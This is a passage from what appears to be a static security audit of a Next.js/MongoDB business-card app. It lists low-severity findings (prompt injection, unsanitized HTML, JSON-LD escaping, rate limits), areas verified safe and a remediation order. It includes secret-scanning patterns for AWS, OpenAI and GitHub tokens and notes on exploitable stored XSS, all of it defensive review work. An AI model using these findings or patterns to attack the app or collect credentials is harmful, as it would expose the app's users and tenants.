  appointment: { id: appointment._id, date: dateObj, slot, status: appointment.status },
}, 201);
```

---

## LOW

| # | Finding | Location | Fix |
|---|---|---|---|
| **L1** | OpenAI prompt injection. Raw `feedback`, `topics`, `language` interpolated into the user turn; quote-delimited only. Bounded — output renders as React children (`review-assistant.tsx:267`), no tools, no server state reachable. | `src/lib/services/review-generate.ts:164-173` | Use `response_format: { type: 'json_schema' }`; post-validate (reject if output contains `http`/`<`); strip `"`/CR/LF from `language` and `topics` |
| **L2** | `privacyPolicyHtml` / `termsHtml` are length-validated only and persisted unsanitized, with **zero** render sinks today. One template away from a second C1. | `src/lib/validation/card.ts:185-186`, `api/cards/[id]/route.ts:191-192` | Included in the C1 patch — sanitize now |
| **L3** | `forgot-password` allows 10 emails per IP per 15 min (`FORGOT_IP_LIMIT`), each triggering a Resend send. Enumeration is correctly prevented (generic response, per-email hash limit of 3) but spend is not. | `src/app/api/auth/forgot-password/route.ts:12-14` | Lower `FORGOT_IP_LIMIT` to 5; add a global daily send budget |
| **L4** | `standeeId` accepted without ObjectId validation in an admin route. Not injection — `findByIdAndDelete` casts and throws → 500. | `src/app/api/admin/standee-qr/route.ts:57,62` | `z.object({ standeeId: objectIdSchema })` |
| **L5** | JSON-LD injected via `dangerouslySetInnerHTML` with `JSON.stringify`, which does **not** escape `</script>`. Safe today (objects are hardcoded at `page.tsx:27-55`) but becomes HTML injection if made dynamic. | `src/app/(public)/page.tsx:91,95` | `JSON.stringify(x).replace(/</g, '\u003c')` |
| **L6** | `target="_blank"` without `noopener` on user-controlled hrefs. | `src/app/(dashboard)/dashboard/products/page.tsx:408` | `rel="noopener noreferrer"` |

**Additional cleanup:** `src/components/public/socials-row.tsx` and `src/components/public/track-link.tsx` are dead code (no importers) and render raw `href={link.url}`. Delete them rather than harden them.

---

## Verified SAFE — no action required

A substantial amount of this codebase is correctly built. Recorded so it is not "fixed" by mistake.

**Authorization / IDOR.** Every one of the 68 `route.ts` handlers outside `/api/public`, `/api/auth`, `/api/health` calls `requireAuth` / `requireAdmin` / `requireAdminStrict` / `requireApiEntitlement` / `requireApiCapability`. Ownership is consistently enforced: `api/inquiries/[id]:40` (`isOwner` check), `api/inquiries/route.ts:60` (`userId` filter), `api/appointments/[id]:37`, `api/product-enquiries/[id]:37`. Admin routes all use `requireAdminStrict`. **No exploitable IDOR/BOLA found** — the ID-*enumeration* precondition from C2 is what must be closed.

**Passwords.** `src/lib/auth.ts:65-78` does `.select('-passwordHash')` and hand-builds a minimal `AuthUser`. `passwordHash` cannot leak. No route returns it.

**CSRF.** `src/middleware.ts:34-46, 90-97` rejects cross-origin `POST/PUT/PATCH/DELETE` for cookie sessions by comparing `Origin` to the request origin.

**Security headers.** `next.config.mjs:30-58`: CSP, `nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy`, `X-Frame-Options: DENY`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, HSTS in prod. (Caveat: `script-src 'unsafe-inline'` at `:28` is why C1 is fully exploitable.)

**NoSQL injection — clean.** All 29 `request.json()` consumers parse with Zod before touching MongoDB. Query params arrive as strings; ObjectId params are pattern-validated. No `find(body)`, no `$where`. Only exception is L4.

**Server-side injection — clean.** No `eval`, `new Function`, `child_process`, `exec`, `spawn`, `vm`. Every `.exec()` match is RegExp/papaparse/Mongoose.

**ReDoS — clean.** Every dynamic `new RegExp` escapes its input (`analytics/route.ts:99`, `services/human-url.ts:130,145`, and 4 export routes). Hand-written patterns are anchored/bounded.

**VCF structural safety.** `src/lib/vcf.ts:23-29` escapes `\ , ; CR LF`; folds to 75 octets per RFC 6350. `Content-Disposition` filename sanitized at `vcf/route.ts:25-31`; `nosniff` at `:103`; `Cache-Control: no-store` at `:102`.

**Redirect routes.** `/r/[...slug]`, `/qr/[id]`, `public-card-page.tsx:17-34` all use explicit `.select()` and gate every redirect through `isSafeExternalUrl`.

**Upload pipeline.** `uploads/presign` uses server-generated `randomUUID()` keys with MIME+size gating and a card-ownership check; `uploads/confirm:50-72` re-reads via `HEAD` and rejects size/content-type mismatches, cleaning up orphans. `/media/[...key]:12-13` enforces a strict `<24-hex userId>/<yyyy-mm>/<uuid>.<ext>` grammar.

**Rate limiting is broadly present.** All 68 routes have a limiter. Auth is tight: login 10/15min, register 10/15min, forgot-password 10/IP + 3/email per 15min with no enumeration oracle. **OpenAI spend is well controlled**: alias limit 60/window (`review-generate.ts:103`) plus an atomic per-tenant daily reservation via `$inc` on `openai.usage.<date>` (`review-generate.ts:112-122`), and only token counts are logged (`:184-197`) — never customer feedback or generated text. Gaps are M1 and M2 only.

**Secrets in the repo — clean.** All 460 tracked files scanned for MongoDB SRV credentials, `AKIA…`, `sk-…`, `gh[pousr]_…`, and PEM private keys: **zero hits**. `.env.local` correctly ignored via `.gitignore:47`. `dev-only-insecure-jwt-secret-change-me` (`env.ts:68`) is unreachable in production (guarded by `isProd` at `:65`). AES-256-GCM implementation in `crypto.ts` is correct (96-bit IV, auth tag verified, versioned payload).

**Billing/entitlement not public.** `openai.usage`, `paymentGateways`, `User.planId` live on `TenantSettings`/`User`, are never joined by any public route, and `settings/route.ts:25-32` destructures away `apiKeyEnc` returning only `hasApiKey` + `usageToday`.

**Analytics read surface.** `api/analytics/route.ts` — session + capability gate, ownership check at `:70-77`, `$group` aggregation only at `:125-136`; `ip`/`userAgent` are never selected.

---

## Remediation order

| # | Item | Effort | Why first |
|---|---|---|---|
| 1 | **C1** — sanitize `descriptionHtml` + backfill | M | Active stored XSS on every public card |
| 2 | **C3** — `toPublicCardDTO` before the client boundary | S | Reachable via View Source; survives a C2-only fix |
| 3 | **C2** — `PUBLIC_CARD_PROJECTION` + regression test | S | Kills the ID-enumeration oracle that gates any future IDOR |
| 4 | **H2** — `status: 'active'` gate | S | Stops suspended/unpublished exposure |
| 5 | **H3** — `escapeFormulae: true` ×3 | S | Unauthenticated input → privileged-user code execution |
| 6 | **M4** — require `APP_KEY` in prod | S | Key separation; rotate after |
| 7 | **M1/M2** — 429 on limit, per-card cap, tap dedup, fail-closed | M | Cost + metric integrity |
| 8 | **H1** — compose `product-config` schemas | S | Same-origin script in dashboard |
| 9 | **M3/M5** — IP truncation, VCF gating | M | Privacy + durable PII leak |
| 10 | **M6/M7**, L1–L6 | S–M | Hardening |

**Two hygiene items to fix alongside:**

1. **`.env.example` is gitignored and untracked.** `.gitignore:47` (`.env*`) catches it, so it will **not** be pushed. That is the canonical env template your 40KB README documents, and it is also the file that documents the `APP_KEY` requirement from M4. Add a negation:
   ```gitignore
   # .gitignore — after the .env* rule
   !.env.example
   ```
   `.env.local` must stay ignored (it holds real secrets).
2. **`MEDIA_DRIVER` is unset with no `S3_*`/`AWS_*` vars.** On Vercel, `storage/index.ts:57` resolves the driver to `'s3'` and the first upload through `storage/s3.ts:18` throws `S3_BUCKET is required when MEDIA_DRIVER=s3`. Runtime-only — every affected route is `force-dynamic`, so the current build is unaffected — but it will surface on deployed media writes.

---

*Report generated by static source review. No application code was modified in producing this report.*